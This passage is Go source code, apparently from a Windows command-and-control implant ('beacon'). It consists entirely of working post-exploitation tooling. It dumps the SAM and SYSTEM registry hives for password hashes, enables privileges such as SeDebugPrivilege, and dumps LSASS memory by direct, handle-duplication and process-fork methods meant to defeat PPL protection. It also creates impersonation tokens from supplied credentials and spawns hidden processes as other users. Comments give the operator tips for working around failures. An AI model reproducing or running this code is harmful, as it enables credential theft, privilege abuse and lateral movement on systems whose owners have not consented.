		advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges :=
		advapi32.NewProc("AdjustTokenPrivileges")

	const sePrivilegeEnabled = 0x00000002

	privName, err := syscall.UTF16PtrFromString("SeBackupPrivilege")
	if err != nil {
		return err
	}
	var luid winLuid
	r, _, errno := procLookupPrivilegeValueW.Call(
		0,
		uintptr(unsafe.Pointer(privName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if r == 0 {
		return fmt.Errorf("LookupPrivilegeValueW: %v", errno)
	}

	type tokenPrivilege struct {
		Luid       winLuid
		Attributes uint32
	}
	type tokenPrivileges struct {
		Count      uint32
		Privileges [1]tokenPrivilege
	}

	tp := tokenPrivileges{
		Count: 1,
		Privileges: [1]tokenPrivilege{
			{Luid: luid, Attributes: sePrivilegeEnabled},
		},
	}
	r, _, errno = procAdjustTokenPrivileges.Call(
		hToken,
		0,
		uintptr(unsafe.Pointer(&tp)),
		0, 0, 0,
	)
	if r == 0 {
		return fmt.Errorf("AdjustTokenPrivileges: %v", errno)
	}
	return nil
}

func readHiveWithBackup(subkey string) ([]byte, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procRegOpenKeyExW := advapi32.NewProc("RegOpenKeyExW")
	procRegSaveKeyExW := advapi32.NewProc("RegSaveKeyExW")
	procRegCloseKey := advapi32.NewProc("RegCloseKey")

	const (
		hkeyLocalMachine = 0x80000002
		keyRead          = 0x20019
		regLatestFormat  = 4
	)

	subkeyW, err := syscall.UTF16PtrFromString(subkey)
	if err != nil {
		return nil, err
	}

	var hKey uintptr
	r, _, _ := procRegOpenKeyExW.Call(
		uintptr(hkeyLocalMachine),
		uintptr(unsafe.Pointer(subkeyW)),
		0,
		uintptr(keyRead),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if r != 0 {
		return nil, fmt.Errorf(
			"RegOpenKeyExW(HKLM\\%s): err=%d", subkey, r)
	}
	defer procRegCloseKey.Call(hKey)

	dir, err := os.MkdirTemp("", "t2-hive-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(dir)

	tmpPath := filepath.Join(dir, subkey+".hive")
	tmpPathW, err := syscall.UTF16PtrFromString(tmpPath)
	if err != nil {
		return nil, err
	}

	r, _, _ = procRegSaveKeyExW.Call(
		hKey,
		uintptr(unsafe.Pointer(tmpPathW)),
		0,
		uintptr(regLatestFormat),
	)
	if r != 0 {
		return nil, fmt.Errorf(
			"RegSaveKeyExW(HKLM\\%s): err=%d — the beacon "+
				"needs SeBackupPrivilege and a local-admin "+
				"token; run `whoami /priv` to see whether the "+
				"privilege is available", subkey, r)
	}

	return os.ReadFile(tmpPath)
}

func NativeHashdump(t Task) (string, error) {
	hToken, err := openAdjustableToken()
	if err != nil {
		return "", fmt.Errorf("hashdump: %w", err)
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCloseHandle := kernel32.NewProc("CloseHandle")
	defer procCloseHandle.Call(hToken)

	if err := enableBackupPrivilege(hToken); err != nil {
		return "", fmt.Errorf(
			"hashdump: could not enable SeBackupPrivilege: %w", err)
	}

	sam, err := readHiveWithBackup("SAM")
	if err != nil {
		return "", fmt.Errorf("hashdump: %w", err)
	}
	system, err := readHiveWithBackup("SYSTEM")
	if err != nil {
		return "", fmt.Errorf("hashdump: %w", err)
	}

	samHash := sha256.Sum256(sam)
	sysHash := sha256.Sum256(system)

	env := map[string]string{
		"sam_b64":       base64.StdEncoding.EncodeToString(sam),
		"system_b64":    base64.StdEncoding.EncodeToString(system),
		"sam_sha256":    hex.EncodeToString(samHash[:]),
		"system_sha256": hex.EncodeToString(sysHash[:]),
	}
	out, err := json.Marshal(env)
	if err != nil {
		return "", err
	}
	return string(out), nil
}

type namedPrivilege struct {
	Name  string `json:"name"`
	State string `json:"state"` // ENABLED | DISABLED | REMOVED
}

func enumerateTokenPrivileges(hToken uintptr) ([]namedPrivilege, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procGetTokenInformation :=
		advapi32.NewProc("GetTokenInformation")
	procLookupPrivilegeNameW :=
		advapi32.NewProc("LookupPrivilegeNameW")

	var size uint32
	procGetTokenInformation.Call(
		hToken,
		uintptr(winTokenPrivileges),
		0, 0,
		uintptr(unsafe.Pointer(&size)),
	)
	if size == 0 {
		return nil, errors.New(
			"GetTokenInformation: returned size 0")
	}

	buf := make([]byte, size)
	r, _, errno := procGetTokenInformation.Call(
		hToken,
		uintptr(winTokenPrivileges),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&size)),
	)
	if r == 0 {
		return nil, fmt.Errorf("GetTokenInformation: %v", errno)
	}
	if len(buf) < 4 {
		return nil, errors.New("privilege buffer too small")
	}

	count := binary.LittleEndian.Uint32(buf[0:4])
	const entrySize = 12

	out := make([]namedPrivilege, 0, count)
	for i := uint32(0); i < count; i++ {
		off := 4 + i*entrySize
		if int(off+entrySize) > len(buf) {
			break
		}
		luid := winLuid{
			LowPart: binary.LittleEndian.Uint32(
				buf[off : off+4]),
			HighPart: int32(binary.LittleEndian.Uint32(
				buf[off+4 : off+8])),
		}
		attrs := binary.LittleEndian.Uint32(
			buf[off+8 : off+12])

		var nameLen uint32
		procLookupPrivilegeNameW.Call(
			0,
			uintptr(unsafe.Pointer(&luid)),
			0,
			uintptr(unsafe.Pointer(&nameLen)),
		)
		if nameLen == 0 {
			continue
		}
		nameBuf := make([]uint16, nameLen+1)
		r, _, _ = procLookupPrivilegeNameW.Call(
			0,
			uintptr(unsafe.Pointer(&luid)),
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(unsafe.Pointer(&nameLen)),
		)
		if r == 0 {
			continue
		}

		state := "DISABLED"
		switch {
		case attrs&privRemoved != 0:
			state = "REMOVED"
		case attrs&privEnabled != 0:
			state = "ENABLED"
		}

		out = append(out, namedPrivilege{
			Name:  syscall.UTF16ToString(nameBuf[:nameLen]),
			State: state,
		})
	}
	return out, nil
}

func normalizePrivName(name string) string {
	name = strings.TrimSpace(name)
	if name == "" {
		return name
	}
	if !strings.HasPrefix(strings.ToLower(name), "se") {
		name = "Se" + name
	}
	if !strings.HasSuffix(strings.ToLower(name), "privilege") {
		name = name + "Privilege"
	}
	return name
}

func setOnePrivilege(hToken uintptr, name string, enable bool) error {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procLookupPrivilegeValueW :=
		advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges :=
		advapi32.NewProc("AdjustTokenPrivileges")

	nameW, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}

	var luid winLuid
	r, _, errno := procLookupPrivilegeValueW.Call(
		0,
		uintptr(unsafe.Pointer(nameW)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if r == 0 {
		return fmt.Errorf(
			"unknown privilege %q (%v)", name, errno)
	}

	type luidAndAttrs struct {
		Luid       winLuid
		Attributes uint32
	}
	type tokenPrivileges struct {
		Count      uint32
		Privileges [1]luidAndAttrs
	}

	attrs := uint32(0)
	if enable {
		attrs = privEnabled
	}
	tp := tokenPrivileges{
		Count: 1,
		Privileges: [1]luidAndAttrs{
			{Luid: luid, Attributes: attrs},
		},
	}

	r, _, errno = procAdjustTokenPrivileges.Call(
		hToken,
		0,
		uintptr(unsafe.Pointer(&tp)),
		0, 0, 0,
	)
	if r == 0 {
		return fmt.Errorf(
			"AdjustTokenPrivileges: %v", errno)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procGetLastError := kernel32.NewProc("GetLastError")
	lastErr, _, _ := procGetLastError.Call()
	const errorNotAllAssigned = 1300
	if lastErr == errorNotAllAssigned {
		return fmt.Errorf(
			"%s is not held by this token "+
				"(it was not in the privilege list, and a "+
				"fresh logon is required to add it)", name)
	}
	return nil
}

func NativeEnablePriv(t Task) (string, error) {
	var (
		disable  bool
		all      bool
		target   string
	)
	for _, a := range t.Args {
		switch {
		case a == "--list" || a == "list":
			// explicit list, same as default
		case a == "--all":
			all = true
		case a == "--disable" || a == "-d":
			disable = true
		case strings.HasPrefix(a, "-"):
			return "", fmt.Errorf(
				"enablepriv: unknown option %q", a)
		default:
			if target != "" {
				return "", fmt.Errorf(
					"enablepriv: unexpected extra argument %q",
					a)
			}
			target = a
		}
	}

	hToken, err := openAdjustableToken()
	if err != nil {
		return "", fmt.Errorf("enablepriv: %w", err)
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCloseHandle := kernel32.NewProc("CloseHandle")
	defer procCloseHandle.Call(hToken)

	if target == "" && !all {
		privs, err := enumerateTokenPrivileges(hToken)
		if err != nil {
			return "", fmt.Errorf("enablepriv: %w", err)
		}
		out, err := json.Marshal(map[string]interface{}{
			"mode":       "list",
			"privileges": privs,
		})
		if err != nil {
			return "", err
		}
		return string(out), nil
	}

	type changeResult struct {
		Name  string `json:"name"`
		OK    bool   `json:"ok"`
		Error string `json:"error,omitempty"`
	}
	results := []changeResult{}

	if all {
		privs, err := enumerateTokenPrivileges(hToken)
		if err != nil {
			return "", fmt.Errorf("enablepriv: %w", err)
		}
		if len(privs) == 0 {
			return "", errors.New(
				"enablepriv: token reports no privileges")
		}
		for _, p := range privs {
			err := setOnePrivilege(hToken, p.Name, !disable)
			r := changeResult{Name: p.Name, OK: err == nil}
			if err != nil {
				r.Error = err.Error()
			}
			results = append(results, r)
		}
	} else {
		name := normalizePrivName(target)
		err := setOnePrivilege(hToken, name, !disable)
		r := changeResult{Name: name, OK: err == nil}
		if err != nil {
			r.Error = err.Error()
		}
		results = append(results, r)
	}

	out, err := json.Marshal(map[string]interface{}{
		"mode":    "change",
		"results": results,
	})
	if err != nil {
		return "", err
	}
	return string(out), nil
}

const (
	// Process access rights.
	procQueryInfo        = 0x0400
	procQueryLimitedInfo = 0x1000
	procVMRead           = 0x0010
	procDupHandle        = 0x0040
	procCreateProcess    = 0x0080

	// File / handle constants.
	genericRead   = 0x80000000
	fileShareRead = 0x00000001
	openExisting  = 3

	duplicateSameAccess = 0x00000002

	// NtQuerySystemInformation class.
	systemExtendedHandleInfo = 64
	statusInfoLengthMismatch = 0xC0000004

	// MiniDumpWriteDump flags.
	miniDumpWithFullMemory      = 0x00000002
	miniDumpWithHandleData      = 0x00000004
	miniDumpWithUnloadedModules = 0x00000020
	miniDumpWithFullMemoryInfo  = 0x00000800
	miniDumpWithThreadInfo      = 0x00001000

	// Section flags for the fork trick.
	sectionMapRead = 0x0004
	sectionQuery   = 0x0001
	secImage       = 0x01000000
	pageReadonly   = 0x02

	// NtCreateProcessEx flags.
	psInheritHandles = 0x04

	// Toolhelp32.
	th32csSnapProcess  = 0x00000002
	invalidHandleValue = ^uintptr(0)
)

func findLsassPID() (uint32, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateToolhelp32Snapshot :=
		kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW := kernel32.NewProc("Process32FirstW")
	procProcess32NextW := kernel32.NewProc("Process32NextW")

	type processEntry32 struct {
		Size            uint32
		CntUsage        uint32
		ProcessID       uint32
		_               uint32 // padding: align DefaultHeapID to 8
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(
		uintptr(th32csSnapProcess), 0)
	if snap == invalidHandleValue {
		return 0, errors.New(
			"CreateToolhelp32Snapshot failed")
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	var entry processEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	r, _, _ := procProcess32FirstW.Call(
		snap, uintptr(unsafe.Pointer(&entry)))
	if r == 0 {
		return 0, errors.New("Process32FirstW failed")
	}

	for {
		name := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(name, "lsass.exe") {
			return entry.ProcessID, nil
		}
		r, _, _ = procProcess32NextW.Call(
			snap, uintptr(unsafe.Pointer(&entry)))
		if r == 0 {
			break
		}
	}
	return 0, errors.New("lsass.exe not found in process snapshot")
}

func openProcessWin(pid uint32, access uint32) (uintptr, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess := kernel32.NewProc("OpenProcess")

	h, _, errno := procOpenProcess.Call(
		uintptr(access), 0, uintptr(pid))
	if h == 0 {
		return 0, fmt.Errorf(
			"OpenProcess(pid=%d access=0x%x): %v",
			pid, access, errno)
	}
	return h, nil
}

func dumpProcessHandle(hProcess uintptr, pid uint32,
	path string) error {

	dbghelp := syscall.NewLazyDLL("dbghelp.dll")
	procMiniDumpWriteDump :=
		dbghelp.NewProc("MiniDumpWriteDump")

	f, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("create dump file: %w", err)
	}
	defer f.Close()

	flags := uintptr(
		miniDumpWithFullMemory |
			miniDumpWithHandleData |
			miniDumpWithFullMemoryInfo |
			miniDumpWithThreadInfo |
			miniDumpWithUnloadedModules)

	r, _, errno := procMiniDumpWriteDump.Call(
		hProcess,
		uintptr(pid),
		f.Fd(),
		flags,
		0, 0, 0,
	)
	if r == 0 {
		_ = os.Remove(path)
		return fmt.Errorf("MiniDumpWriteDump: %v", errno)
	}
	return nil
}

func dumpDirect(pid uint32, path string) error {
	hLsass, err := openProcessWin(pid,
		procQueryInfo|procVMRead)
	if err != nil {
		return err
	}
	defer closeHandleWin(hLsass)
	return dumpProcessHandle(hLsass, pid, path)
}

func dumpFork(pid uint32, path string) error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtCreateSection := ntdll.NewProc("NtCreateSection")
	procNtCreateProcessEx := ntdll.NewProc("NtCreateProcessEx")

	// 1. Open lsass.exe on disk. SEC_IMAGE requires a file handle
	//    as the backing store — passing NULL produces an anonymous
	//    section with no memory in it, which is why the naive
	//    version of this trick yields empty dumps.
	//
	//    On a 32-bit beacon on 64-bit Windows, System32 redirects
	//    to SysWOW64; Sysnative bypasses the redirector. The
	//    framework's primary target is amd64, but the check is
	//    cheap and prevents a confusing "file not found".
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	sysDir := sysRoot + `\System32`
	if runtime.GOARCH == "386" {
		sysDir = sysRoot + `\Sysnative`
	}
	lsassExe := sysDir + `\lsass.exe`

	lsassExeW, err := syscall.UTF16PtrFromString(lsassExe)
	if err != nil {
		return err
	}
	procCreateFileW := syscall.NewLazyDLL("kernel32.dll").
		NewProc("CreateFileW")
	hFile, _, errno := procCreateFileW.Call(
		uintptr(unsafe.Pointer(lsassExeW)),
		uintptr(genericRead),
		uintptr(fileShareRead),
		0,
		uintptr(openExisting),
		0, 0,
	)
	if hFile == 0 || hFile == invalidHandleValue {
		return fmt.Errorf(
			"CreateFileW(%s): %v", lsassExe, errno)
	}
	defer closeHandleWin(hFile)

	// 2. NtCreateSection with SEC_IMAGE on that file handle.
	var hSection uintptr
	var maxSize int64
	r, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		uintptr(sectionMapRead|sectionQuery),
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		uintptr(pageReadonly),
		uintptr(secImage),
		hFile,
	)
	if int32(r) != 0 {
		return fmt.Errorf(
			"NtCreateSection: 0x%08x", uint32(r))
	}
	defer closeHandleWin(hSection)

	// 3. Open LSASS with the minimum needed to use it as the
	//    parent. PROCESS_CREATE_PROCESS is requested because
	//    NtCreateProcessEx checks for it on some Windows builds;
	//    if the request fails, the caller learns via the error.
	hLsass, err := openProcessWin(pid,
		procQueryLimitedInfo|procCreateProcess)
	if err != nil {
		return fmt.Errorf("fork: parent open: %w", err)
	}
	defer closeHandleWin(hLsass)

	// 4. NtCreateProcessEx with LSASS as parent and the section as
	//    the child's image.
	var hChild uintptr
	r, _, _ = procNtCreateProcessEx.Call(
		uintptr(unsafe.Pointer(&hChild)),
		uintptr(procQueryInfo|procVMRead),
		0,
		hLsass,
		uintptr(psInheritHandles),
		hSection,
		0, 0, 0,
	)
	if int32(r) != 0 {
		return fmt.Errorf(
			"NtCreateProcessEx: 0x%08x", uint32(r))
	}
	defer closeHandleWin(hChild)

	return dumpProcessHandle(hChild, pid, path)
}

func dumpDuplicate(pid uint32, path string) error {
	if runtime.GOARCH != "amd64" {
		return errors.New(
			"duplicate: handle table layout is amd64-specific; " +
				"build the beacon for amd64")
	}

	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtQuerySystemInformation :=
		ntdll.NewProc("NtQuerySystemInformation")
	procNtDuplicateObject :=
		ntdll.NewProc("NtDuplicateObject")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procGetCurrentProcess :=
		kernel32.NewProc("GetCurrentProcess")

	// SYSTEM_HANDLE_ENTRY_EX on amd64 is 40 bytes.
	// SYSTEM_HANDLE_INFORMATION_EX header is 16 bytes
	// (2 × ULONG_PTR).
	const (
		entrySize  = 40
		headerSize = 16
	)

	size := 1 << 20
	buf := make([]byte, size)
	var retLen uint32

	r, _, _ := procNtQuerySystemInformation.Call(
		uintptr(systemExtendedHandleInfo),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&retLen)),
	)
	for uint32(r) == statusInfoLengthMismatch {
		if retLen == 0 {
			return errors.New(
				"duplicate: NtQuerySystemInformation returned " +
					"zero size on mismatch")
		}
		size = int(retLen) + (1 << 16)
		buf = make([]byte, size)
		r, _, _ = procNtQuerySystemInformation.Call(
			uintptr(systemExtendedHandleInfo),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(size),
			uintptr(unsafe.Pointer(&retLen)),
		)
	}
	if int32(r) != 0 {
		return fmt.Errorf(
			"duplicate: NtQuerySystemInformation: 0x%08x",
			uint32(r))
	}

	count := binary.LittleEndian.Uint64(buf[0:8])
	hCurrent, _, _ := procGetCurrentProcess.Call()

	for i := uint64(0); i < count; i++ {
		off := headerSize + int(i)*entrySize
		if off+entrySize > len(buf) {
			break
		}
		ownerPID := binary.LittleEndian.Uint64(
			buf[off+8 : off+16])
		handleValue := binary.LittleEndian.Uint64(
			buf[off+16 : off+24])
		grantedAccess := binary.LittleEndian.Uint32(
			buf[off+24 : off+28])

		if ownerPID == 0 ||
			uint32(ownerPID) == pid {
			continue
		}
		if grantedAccess&procVMRead == 0 {
			continue
		}

		hOwner, err := openProcessWin(
			uint32(ownerPID), procDupHandle)
		if err != nil {
			continue
		}

		var hDup uintptr
		r, _, _ = procNtDuplicateObject.Call(
			hOwner,
			uintptr(handleValue),
			hCurrent,
			uintptr(unsafe.Pointer(&hDup)),
			0, 0,
			uintptr(duplicateSameAccess),
		)
		closeHandleWin(hOwner)
		if int32(r) != 0 || hDup == 0 {
			continue
		}

		err = dumpProcessHandle(hDup, pid, path)
		closeHandleWin(hDup)
		if err == nil {
			return nil
		}
	}
	return errors.New(
		"duplicate: no usable VM_READ handle to LSASS found in " +
			"the system handle table")
}

func closeHandleWin(h uintptr) {
	if h == 0 || h == invalidHandleValue {
		return
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCloseHandle := kernel32.NewProc("CloseHandle")
	procCloseHandle.Call(h)
}

func expandWindowsEnv(s string) string {
	var out strings.Builder
	i := 0
	for i < len(s) {
		if s[i] != '%' {
			out.WriteByte(s[i])
			i++
			continue
		}
		j := strings.IndexByte(s[i+1:], '%')
		if j == -1 {
			out.WriteByte('%')
			i++
			continue
		}
		name := s[i+1 : i+1+j]
		if v, ok := os.LookupEnv(name); ok {
			out.WriteString(v)
		} else {
			out.WriteString(s[i : i+1+j+1])
		}
		i += 1 + j + 1
	}
	return os.ExpandEnv(out.String())
}

func NativeLsassDump(t Task) (string, error) {
	var (
		doDump    bool
		useFork   bool
		useDup    bool
		useElev   bool
		outPath   string
	)

	i := 0
	for i < len(t.Args) {
		a := t.Args[i]
		switch a {
		case "--dump", "-d":
			doDump = true
			i++
		case "--fork":
			useFork = true
			i++
		case "--duplicate":
			useDup = true
			i++
		case "--elevate":
			useElev = true
			i++
		case "--out":
			if i+1 >= len(t.Args) {
				return "", errors.New(
					"lsassdump: --out requires a path")
			}
			outPath = t.Args[i+1]
			i += 2
		default:
			return "", fmt.Errorf(
				"lsassdump: unknown argument %q", a)
		}
	}

	if !doDump {
		return "", errors.New(
			"lsassdump: --dump is required (the operation is " +
				"destructive to a running process and to the " +
				"target's EDR log; the flag is the operator's " +
				"acknowledgement)")
	}

	if outPath == "" {
		outPath = `%TEMP%\lsass.dmp`
	}
	outPath = expandWindowsEnv(outPath)
	if outPath == "" || strings.Contains(outPath, "%") {
		return "", fmt.Errorf(
			"lsassdump: could not resolve --out path (got %q)",
			outPath)
	}

	elevated := false
	if useElev {
		hToken, err := openAdjustableToken()
		if err == nil {
			defer closeHandleWin(hToken)
			if err := setOnePrivilege(
				hToken, "SeDebugPrivilege", true); err == nil {
				elevated = true
			}
		}
	}

	pid, err := findLsassPID()
	if err != nil {
		return "", fmt.Errorf("lsassdump: %w", err)
	}

	type result struct {
		OK     bool   `json:"ok"`
		Path   string `json:"path,omitempty"`
		Size   int64  `json:"size,omitempty"`
		Method string `json:"method,omitempty"`
		Error  string `json:"error,omitempty"`
	}

	fail := func(msg string) (string, error) {
		b, _ := json.Marshal(result{OK: false, Error: msg})
		return string(b), nil
	}

	// 1. Direct.
	err = dumpDirect(pid, outPath)
	if err == nil {
		fi, serr := os.Stat(outPath)
		if serr != nil {
			return fail(fmt.Sprintf(
				"dump succeeded but stat failed: %v", serr))
		}
		b, _ := json.Marshal(result{
			OK: true, Path: outPath,
			Size: fi.Size(), Method: "direct",
		})
		return string(b), nil
	}
	directErr := err

	// 2. Duplicate.
	if useDup {
		err = dumpDuplicate(pid, outPath)
		if err == nil {
			fi, _ := os.Stat(outPath)
			b, _ := json.Marshal(result{
				OK: true, Path: outPath,
				Size: fi.Size(), Method: "duplicate",
			})
			return string(b), nil
		}
	}

	// 3. Fork.
	if useFork {
		err = dumpFork(pid, outPath)
		if err == nil {
			fi, _ := os.Stat(outPath)
			b, _ := json.Marshal(result{
				OK: true, Path: outPath,
				Size: fi.Size(), Method: "fork",
			})
			return string(b), nil
		}
	}

	// Nothing worked. Report the first error and a hint.
	hint := ""
	switch {
	case !useElev:
		hint = " (try --elevate if the beacon is not already " +
			"running as SYSTEM)"
	case !elevated:
		hint = " (--elevate was requested but " +
			"SeDebugPrivilege could not be enabled; " +
			"try --duplicate or --fork)"
	case !useDup && !useFork:
		hint = " (try --duplicate or --fork for a " +
			"PPL-protected LSASS)"
	}
	return fail(fmt.Sprintf("%v%s", directErr, hint))
}

const (
	logon32LogonNewCredentials = 9
	logon32ProviderDefault     = 0

	// LOGON32_LOGON_NEW_CREDENTIALS (type 9) is documented as
	// supported only by the WINNT50 logon provider. Passing
	// LOGON32_PROVIDER_DEFAULT (0) makes LogonUserW reject the
	// request with ERROR_INVALID_LOGON_TYPE (1367) before it
	// even attempts authentication, because the resolved
	// default is the older WINNT35/40 path.
	//
	// WINNT50 is the value the API documentation names, and
	// the one every Windows version from Vista onward accepts
	// for a type-9 logon.
	logon32ProviderWinNT50     = 3

	logonWithProfile         = 0x00000001
	createUnicodeEnvironment = 0x00000400
	createNoWindow           = 0x08000000

	startfUseShowWindow = 0x00000001
	swHide              = 0
)

func NativeMakeToken(t Task) (string, error) {
	if len(t.Args) < 1 {
		return "", errors.New(
			`make_token <DOMAIN\user> <password>  |  ` +
				`make_token --revert`)
	}
	if t.Args[0] == "--revert" {
		return NativeRev2Self(t)
	}
	if len(t.Args) < 2 {
		return "", errors.New(
			`make_token <DOMAIN\user> <password>`)
	}

	domain, user := splitDomainUser(t.Args[0])
	password := t.Args[1]

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procLogonUserW := advapi32.NewProc("LogonUserW")
	procCloseHandle := kernel32.NewProc("CloseHandle")

	userW, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return "", err
	}
	passW, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return "", err
	}
	var domainW *uint16
	if domain != "" {
		domainW, err = syscall.UTF16PtrFromString(domain)
		if err != nil {
			return "", err
		}
	}

	var hToken uintptr
	r, _, errno := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userW)),
		uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)),
		uintptr(logon32LogonNewCredentials),
		uintptr(logon32ProviderWinNT50),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("make_token: LogonUserW: %s",
			winLogonErrorMessage(errno))
	}

	// Drop any token already in the slot before replacing it.
	InstallStolenToken(hToken, procCloseHandle)

	full := user
	if domain != "" {
		full = domain + `\` + user
	}
	return fmt.Sprintf(
		"make_token: holding a NEW_CREDENTIALS token for %s "+
			"(logon type 9)\n"+
			"subsequent exec runs as that user; `rev2self` drops it\n",
		full), nil
}

func NativeRev2Self(_ Task) (string, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procRevertToSelf := advapi32.NewProc("RevertToSelf")

	procRevertToSelf.Call()

	if !HasStolenToken() {
		return "rev2self: no token held\n", nil
	}
	CloseStolenTokenOnExit()
	return "rev2self: dropped the held token\n", nil
}

func NativeRunas(t Task) (string, error) {
	if len(t.Args) < 3 {
		return "", errors.New(
			`runas DOMAIN\user password <command> [args...]`)
	}

	domain, user := splitDomainUser(t.Args[0])
	password := t.Args[1]
	cmdline := strings.Join(t.Args[2:], " ")

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateProcessWithLogonW :=
		advapi32.NewProc("CreateProcessWithLogonW")
	procCloseHandle := kernel32.NewProc("CloseHandle")

	userW, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return "", err
	}
	passW, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return "", err
	}
	cmdW, err := syscall.UTF16PtrFromString(cmdline)
	if err != nil {
		return "", err
	}
	var domainW *uint16
	if domain != "" {
		domainW, err = syscall.UTF16PtrFromString(domain)
		if err != nil {
			return "", err
		}
	}

	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = startfUseShowWindow
	si.ShowWindow = swHide

	var pi syscall.ProcessInformation

	r, _, errno := procCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(userW)),
		uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)),
		uintptr(logonWithProfile),
		0, // lpApplicationName: NULL; parsed from cmdline
		uintptr(unsafe.Pointer(cmdW)),
		uintptr(createUnicodeEnvironment|createNoWindow),
		0, // lpEnvironment: inherit from the new logon
		0, // lpCurrentDirectory: user's profile
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return "", fmt.Errorf(
			"runas: CreateProcessWithLogonW: %s",
			winCreateProcessErrorMessage(errno))
	}

	procCloseHandle.Call(uintptr(pi.Thread))
	procCloseHandle.Call(uintptr(pi.Process))

	return fmt.Sprintf(
		"runas: spawned pid %d as %s\\%s (not waiting)\n",
		pi.ProcessId, domain, user), nil
}

func splitDomainUser(arg string) (string, string) {
	if i := strings.IndexAny(arg, `\/`); i >= 0 {
		return arg[:i], arg[i+1:]
	}
	if i := strings.Index(arg, "@"); i >= 0 {
		return arg[i+1:], arg[:i]
	}
	return "", arg
}

func winLogonErrorMessage(err error) string {
	code, _ := err.(syscall.Errno)
	switch uint32(code) {
	case 1326:
		return "user name or password is incorrect (1326)"
	case 1327:
		return "account restriction (1327) — commonly a blank " +
			"password or a policy that refuses logon type 9"
	case 1331:
		return "account is disabled (1331)"
	case 1367:
		return "invalid logon type (1367) — the build is " +
			"passing LOGON32_PROVIDER_DEFAULT to a " +
			"LOGON32_LOGON_NEW_CREDENTIALS logon; the " +
			"provider must be LOGON32_PROVIDER_WINNT50"
	case 1385:
		return "logon type not granted (1385) — the beacon's " +
			"token lacks SeTcbPrivilege or a matching policy " +
			"assignment"
	case 1909:
		return "account is locked out (1909)"
	}
	return err.Error()
}

func winCreateProcessErrorMessage(err error) string {
	code, _ := err.(syscall.Errno)
	switch uint32(code) {
	case 1326:
		return "user name or password is incorrect (1326)"
	case 1327:
		return "account restriction (1327)"
	case 1058:
		return "the Secondary Logon service (seclogon) is " +
			"not running (1058)"
	case 1385:
		return "logon type not granted (1385) — the beacon's " +
			"token likely lacks SeIncreaseQuotaPrivilege or " +
			"the 'Log on as a batch job' right"
	}
	return err.Error()
}

var (
	stolenTokenMu sync.Mutex
	stolenToken   uintptr
)

func InstallStolenToken(hToken uintptr, closer *syscall.LazyProc) {
	stolenTokenMu.Lock()
	defer stolenTokenMu.Unlock()
	if stolenToken != 0 && closer != nil {
		closer.Call(stolenToken)
	}
	stolenToken = hToken
}

func HasStolenToken() bool {
	stolenTokenMu.Lock()
	defer stolenTokenMu.Unlock()
	return stolenToken != 0
}

func CloseStolenTokenOnExit() {
	stolenTokenMu.Lock()
	defer stolenTokenMu.Unlock()
	if stolenToken == 0 {
		return
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCloseHandle := kernel32.NewProc("CloseHandle")
	procCloseHandle.Call(stolenToken)
	stolenToken = 0
}

func HeldToken() uintptr {
	stolenTokenMu.Lock()
	defer stolenTokenMu.Unlock()
	return stolenToken
}